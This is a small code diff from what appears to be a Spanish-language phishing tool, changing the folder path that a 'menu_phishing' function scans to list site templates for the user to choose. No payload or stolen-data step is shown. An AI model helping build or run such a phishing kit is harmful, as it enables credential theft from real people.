@@ -27,7 +27,7 @@ try:
         main()
 
     def menu_phishing():
-        carpetas = next(os.walk('.sites'))[1]
+        carpetas = next(os.walk('sites'))[1]
         for i, carpeta in enumerate(carpetas, start=1):
             print(f"{i}) {carpeta}")
         return carpetas[int(input("Ingresa tu opción: ")) - 1]
